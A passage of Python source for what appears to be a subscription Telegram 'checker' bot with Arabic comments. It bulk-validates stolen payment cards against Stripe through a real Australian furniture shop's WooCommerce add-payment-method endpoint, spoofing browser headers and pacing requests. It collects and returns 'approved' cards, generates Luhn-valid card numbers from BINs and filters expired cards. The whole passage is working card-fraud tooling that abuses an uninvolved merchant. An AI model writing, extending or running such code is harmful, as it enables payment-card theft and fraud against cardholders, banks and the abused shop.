            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        data3 = {
            "type": "card", "card[number]": num, "card[cvc]": cvc,
            "card[exp_year]": f"20{year2}", "card[exp_month]": mon,
            "allow_redisplay": "unspecified", "billing_details[address][postal_code]": "10080",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/5507c504c1; stripe-js-v3/5507c504c1; payment-element; deferred-intent",
            "referrer": BASE, "key": PK_KEY,
        }
        resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data3, timeout=30)
        
        try:
            j = resp.json()
        except:
            return format_sc_result("Stripe error", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        if 'id' not in j:
            err = j.get('error', {}).get('message', 'Payment method creation failed')
            return format_sc_result(err, num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        pmid = j.get('id')
        
        data4 = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pmid,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': create_nonce,
        }
        headers4 = {
            'authority': 'oakfurniturecollection.com.au', 'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': BASE, 'referer': f'{BASE}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        attach_resp = s.post(f"{BASE}/wp-admin/admin-ajax.php", headers=headers4, data=data4)
        
        elapsed = round(time.time() - start_time, 2)
        bin_number = num[:6] if len(num) >= 6 else "N/A"
        bin_info = check_bin_stripe(bin_number, s) if bin_number != "N/A" else None
        
        try:
            payload = attach_resp.json()
            if attach_resp.status_code == 200 and payload.get('success'):
                status = payload.get('data', {}).get('status', '')
                if status == 'succeeded':
                    return format_sc_result("Approved ✅", num, mon, f"20{year2}", cvc, elapsed, bin_info, "approved")
                else:
                    return format_sc_result(f"Status: {status}", num, mon, f"20{year2}", cvc, elapsed, bin_info, "declined")
            else:
                error_msg = payload.get('data', {}).get('error', {}).get('message', 'Declined')
                return format_sc_result(error_msg, num, mon, f"20{year2}", cvc, elapsed, bin_info, "declined")
        except:
            return format_sc_result("Parse error", num, mon, f"20{year2}", cvc, elapsed, bin_info, "declined")
            
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return format_sc_result(f"Error: {str(e)[:50]}", num, mon, f"20{year2}", cvc, elapsed, None, "declined")

def format_sc_result(status, num, mon, year, cvc, elapsed, bin_info, result_type):
    if result_type == "approved":
        title = "𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅"
        response = "<code>succeeded</code>"
    elif result_type == "declined":
        title = "𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌"
        response = f"<code>{status}</code>" if status and "❌" not in str(status) else "<code>declined</code>"
    else:
        title = "⚠️ System Error"
        response = f"<code>{status}</code>"
    
    if bin_info:
        bin_line = f"{bin_info['bin']} - {bin_info['type']} - {bin_info['brand']} - {bin_info['level']}"
        bank_line = f"{bin_info['bank']}"
        country_line = f"{bin_info['country']} - {bin_info['flag']}"
    else:
        bin_line = "N/A"
        bank_line = "N/A"
        country_line = "N/A - 🏳️"
    
    return (f"{title}\n\n"
            f"𝐂𝐚𝐫𝐝 ➙ <code>{num}|{mon}|{year}|{cvc}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Stripe Charge (ppool)\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ {response}\n\n"
            f"𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙ : {bin_line}\n"
            f"𝐁𝐚𝐧𝐤 ➙ {bank_line}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙ {country_line}\n\n"
            f"𝗧𝗼𝗼𝗸 : <code>{elapsed}</code> (seconds) PREMIUM")

def create_sc_buttons(card_number, status, approved, declined, total, show_stop=True):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn_card = types.InlineKeyboardButton(
        f"💳 {card_number}", 
        callback_data="sc_card"
    )
    markup.add(btn_card)
    
    btn_status = types.InlineKeyboardButton(
        f"📨 {status}", 
        callback_data="sc_status"
    )
    markup.add(btn_status)
    
    btn_approved = types.InlineKeyboardButton(
        f"✅ Approved: {approved}", 
        callback_data="sc_approved"
    )
    btn_declined = types.InlineKeyboardButton(
        f"❌ Declined: {declined}", 
        callback_data="sc_declined"
    )
    markup.add(btn_approved, btn_declined)
    
    btn_total = types.InlineKeyboardButton(
        f"📊 Total: {total}", 
        callback_data="sc_total"
    )
    markup.add(btn_total)
    
    if show_stop:
        btn_stop = types.InlineKeyboardButton(
            "⏹️ Stop Scan", 
            callback_data="sc_stop"
        )
        markup.add(btn_stop)
    
    return markup

def scan_sc_file_background(message, file_path, original_filename, user_id):
    sc_sessions[user_id] = {
        'active': True,
        'stop': False,
        'approved': 0,
        'declined': 0,
        'total': 0,
        'elapsed': 0,
        'current_card': "Waiting...",
        'current_status': "⏳ Starting...",
        'approved_cards': []
    }
    
    try:
        cards = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) != 4:
                    continue
                num, mon, year, cvc = parts
                num = num.replace(' ', '')
                mon = mon.zfill(2)
                if len(year) == 4 and year.startswith('20'):
                    year2 = year[2:]
                else:
                    year2 = year[-2:]
                cards.append((num, mon, year2, cvc))
        
        os.remove(file_path)
        
        if not cards:
            bot.send_message(message.chat.id, "❌ File is empty or invalid format.")
            sc_sessions[user_id]['active'] = False
            return
        
        total = len(cards)
        approved = 0
        declined = 0
        errors = 0
        start_time = time.time()
        current_card = "Waiting..."
        current_status = "⏳ Starting..."
        approved_cards = []
        
        sc_sessions[user_id]['total'] = total
        sc_sessions[user_id]['approved_cards'] = approved_cards
        
        markup = create_sc_buttons(
            current_card,
            current_status,
            approved,
            declined,
            total
        )
        
        status_msg = bot.send_message(
            message.chat.id,
            f"📁 File: {original_filename}\n"
            f"⚡ Gateway: Stripe Charge (ppool)\n"
            f"⏳ Time: 0s\n"
            f"🕐 {datetime.now().strftime('%I:%M %p')}",
            reply_markup=markup,
            parse_mode="HTML"
        )
        
        sc_sessions[user_id]['message_id'] = status_msg.message_id
        
        for idx, (num, mon, year2, cvc) in enumerate(cards, 1):
            if sc_sessions[user_id].get('stop', False):
                bot.send_message(
                    message.chat.id,
                    f"⏹ Scan stopped at {idx-1}/{total} cards."
                )
                break
            
            card_display = f"{num}|{mon}|20{year2}|{cvc}"
            current_card = card_display
            sc_sessions[user_id]['current_card'] = current_card
            
            try:
                result = scan_single_card_sc(num, mon, year2, cvc)
                
                if "✅" in result:
                    approved += 1
                    current_status = "Approved ✅"
                    approved_cards.append(card_display)
                    sc_sessions[user_id]['approved_cards'] = approved_cards
                    bot.send_message(message.chat.id, result, parse_mode="HTML")
                elif "❌" in result:
                    declined += 1
                    current_status = "Declined ❌"
                else:
                    errors += 1
                    current_status = "⚠️ Error"
                
                sc_sessions[user_id]['approved'] = approved
                sc_sessions[user_id]['declined'] = declined
                sc_sessions[user_id]['current_status'] = current_status
                
            except Exception as e:
                errors += 1
                current_status = f"❌ {str(e)[:20]}"
            
            elapsed = round(time.time() - start_time, 2)
            sc_sessions[user_id]['elapsed'] = elapsed
            
            new_markup = create_sc_buttons(
                current_card,
                current_status,
                approved,
                declined,
                total
            )
            
            try:
                bot.edit_message_text(
                    f"📁 File: {original_filename}\n"
                    f"⚡ Gateway: Stripe Charge (ppool)\n"
                    f"⏳ Time: {elapsed}s\n"
                    f"🕐 {datetime.now().strftime('%I:%M %p')}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    reply_markup=new_markup,
                    parse_mode="HTML"
                )
            except:
                pass
            
            time.sleep(random.uniform(1, 2))
        
        elapsed = round(time.time() - start_time, 2)
        sc_sessions[user_id]['elapsed'] = elapsed
        
        if approved_cards:
            approved_content = '\n'.join(approved_cards)
            output_file = io.BytesIO()
            output_file.write(approved_content.encode('utf-8'))
            output_file.seek(0)
            
            bot.send_document(
                message.chat.id,
                output_file,
                visible_file_name=f'sc_approved_{original_filename}',
                caption=f"✅ Approved Cards: {len(approved_cards)}"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ No approved cards found."
            )
        
        final_markup = create_sc_buttons(
            "✅ Completed",
            "Done",
            approved,
            declined,
            total,
            show_stop=False
        )
        
        if not sc_sessions[user_id].get('stop', False):
            final_msg = (
                f"✅ Scan Completed!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: Stripe Charge (ppool)\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        else:
            final_msg = (
                f"⏹ Scan Stopped!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: Stripe Charge (ppool)\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Approved: {approved}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        
        try:
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                reply_markup=final_markup,
                parse_mode="HTML"
            )
        except:
            bot.send_message(message.chat.id, final_msg, reply_markup=final_markup, parse_mode="HTML")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    finally:
        sc_sessions[user_id]['active'] = False

# ======================================================
# ===== معالج أزرار Stripe 1 =====
# ======================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith("stripe_"))
def handle_stripe_buttons(call):
    user_id = str(call.from_user.id)
    
    if call.data == "stripe_card":
        card = scanning_sessions.get(user_id, {}).get('current_card', 'No card')
        bot.answer_callback_query(call.id, f"💳 Current: {card}")
    
    elif call.data == "stripe_status":
        status = scanning_sessions.get(user_id, {}).get('current_status', 'Unknown')
        bot.answer_callback_query(call.id, f"📨 {status}")
    
    elif call.data == "stripe_approved":
        approved = scanning_sessions.get(user_id, {}).get('approved', 0)
        bot.answer_callback_query(call.id, f"✅ Approved: {approved}")
    
    elif call.data == "stripe_declined":
        declined = scanning_sessions.get(user_id, {}).get('declined', 0)
        bot.answer_callback_query(call.id, f"❌ Declined: {declined}")
    
    elif call.data == "stripe_total":
        total = scanning_sessions.get(user_id, {}).get('total', 0)
        bot.answer_callback_query(call.id, f"📊 Total: {total}")
    
    elif call.data == "stripe_stop":
        if user_id in scanning_sessions and scanning_sessions[user_id].get('active', False):
            scanning_sessions[user_id]['stop'] = True
            bot.answer_callback_query(call.id, "⏹ Stopping scan...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ No active scan")

# ======================================================
# ===== معالج أزرار Stripe 2 =====
# ======================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith("stripe2_"))
def handle_stripe2_buttons(call):
    user_id = str(call.from_user.id)
    
    if call.data == "stripe2_card":
        card = stripe2_sessions.get(user_id, {}).get('current_card', 'No card')
        bot.answer_callback_query(call.id, f"💳 Current: {card}")
    
    elif call.data == "stripe2_status":
        status = stripe2_sessions.get(user_id, {}).get('current_status', 'Unknown')
        bot.answer_callback_query(call.id, f"📨 {status}")
    
    elif call.data == "stripe2_approved":
        approved = stripe2_sessions.get(user_id, {}).get('approved', 0)
        bot.answer_callback_query(call.id, f"✅ Approved: {approved}")
    
    elif call.data == "stripe2_declined":
        declined = stripe2_sessions.get(user_id, {}).get('declined', 0)
        bot.answer_callback_query(call.id, f"❌ Declined: {declined}")
    
    elif call.data == "stripe2_total":
        total = stripe2_sessions.get(user_id, {}).get('total', 0)
        bot.answer_callback_query(call.id, f"📊 Total: {total}")
    
    elif call.data == "stripe2_stop":
        if user_id in stripe2_sessions and stripe2_sessions[user_id].get('active', False):
            stripe2_sessions[user_id]['stop'] = True
            bot.answer_callback_query(call.id, "⏹ Stopping scan...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ No active scan")

# ======================================================
# ===== معالج أزرار VBV 1 =====
# ======================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith("vbv_"))
def handle_vbv_buttons(call):
    user_id = str(call.from_user.id)
    
    if call.data == "vbv_card":
        card = vbv_scanning_sessions.get(user_id, {}).get('current_card', 'No card')
        bot.answer_callback_query(call.id, f"💳 Current: {card}")
    
    elif call.data == "vbv_status":
        status = vbv_scanning_sessions.get(user_id, {}).get('current_status', 'Unknown')
        bot.answer_callback_query(call.id, f"📨 {status}")
    
    elif call.data == "vbv_passed":
        passed = vbv_scanning_sessions.get(user_id, {}).get('passed', 0)
        bot.answer_callback_query(call.id, f"✅ Passed: {passed}")
    
    elif call.data == "vbv_failed":
        failed = vbv_scanning_sessions.get(user_id, {}).get('failed', 0)
        bot.answer_callback_query(call.id, f"❌ Failed: {failed}")
    
    elif call.data == "vbv_total":
        total = vbv_scanning_sessions.get(user_id, {}).get('total', 0)
        bot.answer_callback_query(call.id, f"📊 Total: {total}")
    
    elif call.data == "vbv_stop":
        if user_id in vbv_scanning_sessions and vbv_scanning_sessions[user_id].get('active', False):
            vbv_scanning_sessions[user_id]['stop'] = True
            bot.answer_callback_query(call.id, "⏹ Stopping VBV scan...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ No active VBV scan")

# ======================================================
# ===== معالج أزرار VBV V2 =====
# ======================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith("vbv2_"))
def handle_vbv2_buttons(call):
    user_id = str(call.from_user.id)
    
    if call.data == "vbv2_card":
        card = vbv2_sessions.get(user_id, {}).get('current_card', 'No card')
        bot.answer_callback_query(call.id, f"💳 Current: {card}")
    
    elif call.data == "vbv2_status":
        status = vbv2_sessions.get(user_id, {}).get('current_status', 'Unknown')
        bot.answer_callback_query(call.id, f"📨 {status}")
    
    elif call.data == "vbv2_passed":
        passed = vbv2_sessions.get(user_id, {}).get('passed', 0)
        bot.answer_callback_query(call.id, f"✅ Passed: {passed}")
    
    elif call.data == "vbv2_failed":
        failed = vbv2_sessions.get(user_id, {}).get('failed', 0)
        bot.answer_callback_query(call.id, f"❌ Failed: {failed}")
    
    elif call.data == "vbv2_total":
        total = vbv2_sessions.get(user_id, {}).get('total', 0)
        bot.answer_callback_query(call.id, f"📊 Total: {total}")
    
    elif call.data == "vbv2_stop":
        if user_id in vbv2_sessions and vbv2_sessions[user_id].get('active', False):
            vbv2_sessions[user_id]['stop'] = True
            bot.answer_callback_query(call.id, "⏹ Stopping VBV V2 scan...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ No active VBV V2 scan")

# ======================================================
# ===== معالج أزرار Stripe Charge (ppool) =====
# ======================================================

@bot.callback_query_handler(func=lambda call: call.data.startswith("sc_"))
def handle_sc_buttons(call):
    user_id = str(call.from_user.id)
    
    if call.data == "sc_card":
        card = sc_sessions.get(user_id, {}).get('current_card', 'No card')
        bot.answer_callback_query(call.id, f"💳 Current: {card}")
    
    elif call.data == "sc_status":
        status = sc_sessions.get(user_id, {}).get('current_status', 'Unknown')
        bot.answer_callback_query(call.id, f"📨 {status}")
    
    elif call.data == "sc_approved":
        approved = sc_sessions.get(user_id, {}).get('approved', 0)
        bot.answer_callback_query(call.id, f"✅ Approved: {approved}")
    
    elif call.data == "sc_declined":
        declined = sc_sessions.get(user_id, {}).get('declined', 0)
        bot.answer_callback_query(call.id, f"❌ Declined: {declined}")
    
    elif call.data == "sc_total":
        total = sc_sessions.get(user_id, {}).get('total', 0)
        bot.answer_callback_query(call.id, f"📊 Total: {total}")
    
    elif call.data == "sc_stop":
        if user_id in sc_sessions and sc_sessions[user_id].get('active', False):
            sc_sessions[user_id]['stop'] = True
            bot.answer_callback_query(call.id, "⏹ Stopping scan...")
        else:
            bot.answer_callback_query(call.id, "ℹ️ No active scan")

# ======================================================
# ===== عرض القائمة الرئيسية =====
# ======================================================

def show_main_menu(user_id, chat_id, message_id=None):
    caption = get_text(user_id, "welcome")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_gate = types.InlineKeyboardButton(get_text(user_id, "btn_gate"), callback_data="gate")
    btn_gates_mass = types.InlineKeyboardButton(get_text(user_id, "btn_gates_mass"), callback_data="gates_mass")
    btn_killer = types.InlineKeyboardButton(get_text(user_id, "btn_killer"), callback_data="killer")
    btn_profile = types.InlineKeyboardButton(get_text(user_id, "btn_profile"), callback_data="profile")
    btn_subscribe = types.InlineKeyboardButton(get_text(user_id, "btn_subscribe"), callback_data="subscribe")
    btn_tools = types.InlineKeyboardButton(get_text(user_id, "btn_tools"), callback_data="tools")
    btn_owner = types.InlineKeyboardButton(get_text(user_id, "btn_owner"), callback_data="owner")
    btn_group = types.InlineKeyboardButton(get_text(user_id, "btn_group"), callback_data="group")
    btn_lang = types.InlineKeyboardButton(get_text(user_id, "btn_language"), callback_data="show_language")
    
    markup.add(btn_gate, btn_gates_mass)
    markup.add(btn_killer)
    markup.add(btn_profile, btn_subscribe)
    markup.add(btn_tools)
    markup.add(btn_owner, btn_group)
    markup.add(btn_lang)
    
    image_path = get_random_image()
    
    if image_path:
        try:
            with open(image_path, 'rb') as photo:
                if message_id:
                    bot.edit_message_media(
                        chat_id=chat_id,
                        message_id=message_id,
                        media=types.InputMediaPhoto(photo, caption=caption, parse_mode="HTML"),
                        reply_markup=markup
                    )
                else:
                    bot.send_photo(chat_id, photo, caption=caption, reply_markup=markup, parse_mode="HTML")
        except:
            if message_id:
                bot.edit_message_text(caption, chat_id=chat_id, message_id=message_id, reply_markup=markup, parse_mode="HTML")
            else:
                bot.send_message(chat_id, caption, reply_markup=markup, parse_mode="HTML")
    else:
        if message_id:
            bot.edit_message_text(caption, chat_id=chat_id, message_id=message_id, reply_markup=markup, parse_mode="HTML")
        else:
            bot.send_message(chat_id, caption, reply_markup=markup, parse_mode="HTML")

# ======================================================
# ===== أوامر البوت الأساسية =====
# ======================================================

@bot.message_handler(commands=["start"])
def handle_start(message):
    user_id = str(message.from_user.id)
    
    if user_id not in user_language:
        markup = types.InlineKeyboardMarkup(row_width=3)
        btn_ar = types.InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar")
        btn_en = types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
        btn_ru = types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")
        markup.add(btn_ar, btn_en, btn_ru)
        
        bot.send_message(
            message.chat.id,
            "🌐 اختر لغتك / Choose your language / Выберите язык:",
            reply_markup=markup,
            parse_mode="HTML"
        )
    else:
        show_main_menu(user_id, message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def set_language(call):
    user_id = str(call.from_user.id)
    lang = call.data.split("_")[1]
    
    user_language[user_id] = lang
    bot.answer_callback_query(call.id, get_text(user_id, "lang_set"))
    bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
    show_main_menu(user_id, call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "show_language")
def show_language_menu(call):
    user_id = str(call.from_user.id)
    markup = types.InlineKeyboardMarkup(row_width=3)
    btn_ar = types.InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar")
    btn_en = types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    btn_ru = types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")
    btn_back = types.InlineKeyboardButton(get_text(user_id, "btn_back"), callback_data="back_to_main")
    markup.add(btn_ar, btn_en, btn_ru)
    markup.add(btn_back)
    
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption="🌐 " + get_text(user_id, "choose_lang"),
        reply_markup=markup,
        parse_mode="HTML"
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main_callback(call):
    user_id = str(call.from_user.id)
    show_main_menu(user_id, call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "gate")
def gate_callback(call):
    user_id = str(call.from_user.id)
    bot.answer_callback_query(call.id)
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=get_text(user_id, "gate"),
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == "gates_mass")
def gates_mass_callback(call):
    user_id = str(call.from_user.id)
    bot.answer_callback_query(call.id)
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=get_text(user_id, "gates_mass"),
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == "killer")
def killer_callback(call):
    user_id = str(call.from_user.id)
    bot.answer_callback_query(call.id)
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption="💀 Coming soon...\nThis feature is under development",
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data == "profile")
def profile_callback(call):
    user_id = str(call.from_user.id)
    username = call.from_user.username or "None"
    name = call.from_user.first_name
    
    sub = subscription_manager.get_subscription(user_id)
    if sub:
        expiry = datetime.fromisoformat(sub)
        remaining = expiry - datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        if user_language.get(user_id, "ar") == "ar":
            sub_status = f"✅ نشط - ينتهي بعد {days} يوم و {hours} ساعة"
            checks_left = "♾️ غير محدود"
        else:
            sub_status = f"✅ Active - expires in {days}d {hours}h"
            checks_left = "♾️ Unlimited"
    else:
        if user_language.get(user_id, "ar") == "ar":
            sub_status = "❌ غير مشترك"
            checks_left = "0 (اشترك للفحص)"
        else:
            sub_status = "❌ Not subscribed"
            checks_left = "0 (Subscribe to check)"
    
    text = get_text(user_id, "profile", username=username, name=name, sub_status=sub_status, checks_left=checks_left)
    
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=text,
        parse_mode="HTML"
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "subscribe")
def subscribe_callback(call):
    user_id = str(call.from_user.id)
    text = get_text(user_id, "subscribe", binance=BINANCE_ID, owner=OWNER_USERNAME)
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=text,
        parse_mode="HTML"
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "tools")
def tools_callback(call):
    user_id = str(call.from_user.id)
    text = get_text(user_id, "tools")
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=text,
        parse_mode="HTML"
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "owner")
def owner_callback(call):
    user_id = str(call.from_user.id)
    markup = types.InlineKeyboardMarkup()
    btn_contact = types.InlineKeyboardButton(
        "📞 " + ("تواصل مع المطور" if user_language.get(user_id, "ar") == "ar" else "Contact Developer"),
        url=f"https://t.me/V_I8_P"
    )
    markup.add(btn_contact)
    text = get_text(user_id, "owner", owner=OWNER_USERNAME)
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=text,
        reply_markup=markup,
        parse_mode="HTML"
    )
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "group")
def group_callback(call):
    user_id = str(call.from_user.id)
    markup = types.InlineKeyboardMarkup()
    btn_group = types.InlineKeyboardButton(
        "👥 " + ("انضم للجروب" if user_language.get(user_id, "ar") == "ar" else "Join Group"),
        url="https://t.me/Sql_Dork"
    )
    markup.add(btn_group)
    text = get_text(user_id, "group")
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=text,
        reply_markup=markup,
        parse_mode="HTML"
    )
    bot.answer_callback_query(call.id)

# ======================================================
# ===== أوامر توليد ومعلومات BIN =====
# ======================================================

@bot.message_handler(commands=["gen"])
def generate_cards_from_bin(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, get_text(user_id, "gen_usage"))
            return
        
        bin_input = args[1].strip()
        if not bin_input.isdigit() or len(bin_input) != 6:
            bot.reply_to(message, get_text(user_id, "gen_invalid"))
            return
        
        cards = []
        for _ in range(10):
            remaining = str(random.randint(0, 10**9 - 1)).zfill(9)
            card_without_check = bin_input + remaining
            total = 0
            for i, digit in enumerate(card_without_check):
                d = int(digit)
                if (len(card_without_check) - i) % 2 == 0:
                    d *= 2
                    if d > 9:
                        d -= 9
                total += d
            check_digit = (10 - (total % 10)) % 10
            card_number = card_without_check + str(check_digit)
            
            month = str(random.randint(1, 12)).zfill(2)
            year = str(random.randint(26, 30))
            cvv = str(random.randint(100, 999))
            
            cards.append(f"{card_number}|{month}|{year}|{cvv}")
        
        msg = get_text(user_id, "gen_title", bin=bin_input)
        
        for card in cards:
            msg += f"<code>{card}</code>\n"
        
        bin_info = dato(bin_input)
        if bin_info:
            msg += "\n" + get_text(user_id, "bin_info", 
                brand=bin_info["brand"], 
                type=bin_info["type"], 
                level=bin_info["level"], 
                bank=bin_info["bank"], 
                country=bin_info["country"], 
                flag=bin_info["flag"]
            )
        
        bot.reply_to(message, msg, parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, get_text(user_id, "gen_error", error=str(e)))

@bot.message_handler(commands=["bin"])
def bin_info_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, get_text(user_id, "bin_usage"))
            return
        
        bin_input = args[1].strip()
        if not bin_input.isdigit() or len(bin_input) != 6:
            bot.reply_to(message, get_text(user_id, "bin_invalid"))
            return
        
        msg = get_text(user_id, "bin_title", bin=bin_input)
        
        bin_info = dato(bin_input)
        if bin_info:
            msg += "\n" + get_text(user_id, "bin_info", 
                brand=bin_info["brand"], 
                type=bin_info["type"], 
                level=bin_info["level"], 
                bank=bin_info["bank"], 
                country=bin_info["country"], 
                flag=bin_info["flag"]
            )
        else:
            msg += "\n" + get_text(user_id, "bin_no_info")
        
        bot.reply_to(message, msg, parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, get_text(user_id, "gen_error", error=str(e)))

# ======================================================
# ===== أوامر تقسيم وتنظيف الملفات =====
# ======================================================

@bot.message_handler(commands=["clean"])
def clean_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ " + ("يرجى الرد على ملف txt باستخدام /clean" if user_language.get(user_id, "ar") == "ar" else "Please reply to a txt file with /clean"))
        return
    
    file = message.reply_to_message.document
    if not file.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ " + ("يرجى الرد على ملف txt فقط" if user_language.get(user_id, "ar") == "ar" else "Please reply to a txt file only"))
        return
    
    msg = bot.reply_to(message, get_text(user_id, "clean_start"))
    
    try:
        file_info = bot.get_file(file.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        content = downloaded.decode('utf-8', errors='ignore')
        valid_cards = clean_expired_cards(content)
        
        if valid_cards:
            new_content = '\n'.join(valid_cards)
            output_file = io.BytesIO()
            output_file.write(new_content.encode('utf-8'))
            output_file.seek(0)
            
            bot.delete_message(chat_id=message.chat.id, message_id=msg.message_id)
            bot.send_document(
                message.chat.id,
                output_file,
                visible_file_name=f'cleaned_{file.file_name}',
                caption=get_text(user_id, "clean_done", count=len(valid_cards))
            )
        else:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=get_text(user_id, "clean_no_cards")
            )
        
    except Exception as e:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=get_text(user_id, "clean_error", error=str(e))
        )

@bot.message_handler(commands=["kw"])
def kw_command(message):
    user_id = str(message.from_user.id)
    
    if not subscription_manager.is_subscribed(user_id) and int(user_id) not in ADMIN_IDS:
        bot.reply_to(
            message,
            get_text(user_id, "no_sub", binance=BINANCE_ID, owner=OWNER_USERNAME),
            parse_mode="HTML"
        )
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ " + ("يرجى الرد على ملف txt باستخدام /kw" if user_language.get(user_id, "ar") == "ar" else "Please reply to a txt file with /kw"))
        return
    
    file = message.reply_to_message.document
    if not file.file_name.endswith('.txt'):
